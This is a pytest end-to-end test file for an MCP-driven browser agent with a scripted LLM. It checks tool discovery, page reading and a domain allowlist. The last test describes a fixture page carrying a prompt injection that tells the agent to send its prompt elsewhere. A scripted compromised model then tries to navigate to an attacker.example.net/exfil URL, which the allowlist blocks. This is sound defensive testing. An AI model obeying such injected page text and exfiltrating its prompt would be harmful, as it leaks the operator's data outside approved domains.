"""End-to-end: a real Playwright MCP server driving a real browser against a
static page served by the test harness.

This is the only test that leaves the process. It is skipped unless
``RUN_E2E=1`` because it downloads/spawns a browser::

    RUN_E2E=1 pytest -m e2e

The LLM is still scripted -- the point is to prove the MCP client layer, the
agent loop, the allowlist and the event stream work against a genuine browser,
not to test the model's judgement.
"""

from __future__ import annotations

import asyncio
import functools
import http.server
import os
import shutil
import socket
import threading
from pathlib import Path

import pytest

from agent import AgentSpec, BrowserAgent, RunOptions
from conftest import AutoApprovalGate, RecordingSink, ScriptedLLM, final_turn, tool_turn
from mcp_client import MCPBrowserSession, MCPConfig

pytestmark = [
    pytest.mark.e2e,
    pytest.mark.skipif(
        os.environ.get("RUN_E2E") != "1",
        reason="set RUN_E2E=1 to run the real-browser end-to-end test",
    ),
]

FIXTURES = Path(__file__).parent / "fixtures"


def _free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


@pytest.fixture(scope="module")
def static_site():
    """Serve tests/fixtures on 127.0.0.1 for the duration of the module."""
    port = _free_port()
    handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=str(FIXTURES))
    server = http.server.ThreadingHTTPServer(("127.0.0.1", port), handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"http://127.0.0.1:{port}"
    finally:
        server.shutdown()
        server.server_close()


@pytest.fixture
async def mcp_session():
    """A real Playwright MCP server, spawned over stdio and torn down after."""
    config = MCPConfig(
        transport="stdio",
        npx_path=shutil.which("npx") or shutil.which("npx.cmd") or "npx",
        browser="chromium",
        headless=True,
        isolated=True,
        # The first run may download the MCP package and the browser.
        handshake_timeout=180.0,
        tool_timeout=60.0,
    )
    async with MCPBrowserSession(config) as session:
        yield session


async def test_mcp_server_exposes_browser_tools(mcp_session):
    """Tool discovery is dynamic: assert on shape, not on an exact list."""
    names = mcp_session.tool_names
    assert names, "the MCP server exposed no tools"
    assert any("navigate" in name for name in names)
    assert any("snapshot" in name for name in names)

    schema = mcp_session.anthropic_tools()[0]
    assert set(schema) == {"name", "description", "input_schema"}
    assert schema["input_schema"]["type"] == "object"


async def test_agent_reads_a_real_page_through_mcp(mcp_session, static_site):
    navigate = mcp_session.find_tool("browser_navigate", contains=("navigate",))
    snapshot = mcp_session.find_tool("browser_snapshot", contains=("snapshot",))
    assert navigate and snapshot

    sink = RecordingSink()
    options = RunOptions(
        max_steps=6,
        timeout_seconds=120.0,
        allowed_domains=["127.0.0.1"],
        require_approval=False,
        screenshot_every_step=True,
    )
    spec = AgentSpec(
        run_id="e2e-1",
        task="Read the product list and report the cheapest item.",
        start_url=static_site,
        options=options,
    )
    llm = ScriptedLLM(
        [
            tool_turn(snapshot, {}, call_id="c1", text="Taking a snapshot."),
            final_turn(
                'The cheapest item is the Aurora Wireless Headphones.\n'
                '```json\n{"name": "Aurora Wireless Headphones", "price": 39.99}\n```'
            ),
        ],
        repeat_last=False,
    )

    agent = BrowserAgent(spec, mcp_session, llm, sink, AutoApprovalGate())
    outcome = await asyncio.wait_for(agent.run(), timeout=180)

    assert outcome.status == "succeeded", outcome.error
    assert outcome.result["data"]["price"] == 39.99

    # The accessibility snapshot really contains the page.
    snapshot_text = "\n".join(event.text for event in sink.of_type("tool_result"))
    assert "Aurora Wireless Headphones" in snapshot_text
    assert "Demo Store" in snapshot_text

    # A real screenshot was captured and handed to the sink.
    assert sink.of_type("screenshot"), "no screenshot event was emitted"
    assert sink.screenshots and sink.screenshots[0][:4] == b"\x89PNG"


async def test_page_content_cannot_send_the_agent_off_the_allowlist(mcp_session, static_site):
    """Defence in depth against prompt injection.

    The fixture page contains text instructing the agent to exfiltrate its
    prompt to another host. Even if a model were to comply, the allowlist
    refuses the navigation before it reaches the browser.
    """
    navigate = mcp_session.find_tool("browser_navigate", contains=("navigate",))
    snapshot = mcp_session.find_tool("browser_snapshot", contains=("snapshot",))

    sink = RecordingSink()
    options = RunOptions(
        max_steps=6,
        timeout_seconds=120.0,
        allowed_domains=["127.0.0.1"],
        require_approval=False,  # so the allowlist is a hard refusal
        screenshot_every_step=False,
    )
    spec = AgentSpec(
        run_id="e2e-2", task="Summarise the page.", start_url=static_site, options=options
    )
    llm = ScriptedLLM(
        [
            tool_turn(snapshot, {}, call_id="c1"),
            # A compromised model obeying the injected instruction:
            tool_turn(navigate, {"url": "https://attacker.example.net/exfil"}, call_id="c2"),
            final_turn("I was blocked from leaving the allowed domains."),
        ],
        repeat_last=False,
    )

    agent = BrowserAgent(spec, mcp_session, llm, sink, AutoApprovalGate())
    outcome = await asyncio.wait_for(agent.run(), timeout=180)

    assert outcome.status == "succeeded"

    # The injected text was observed as data...
    observed = "\n".join(event.text for event in sink.of_type("tool_result"))
    assert "maintenance mode" in observed

    # ...and the navigation it demanded was refused.
    blocked = [event for event in sink.of_type("error") if event.kind == "allowlist_blocked"]
    assert blocked, "off-allowlist navigation should have been blocked"
    assert "attacker.example.net" in blocked[0].message
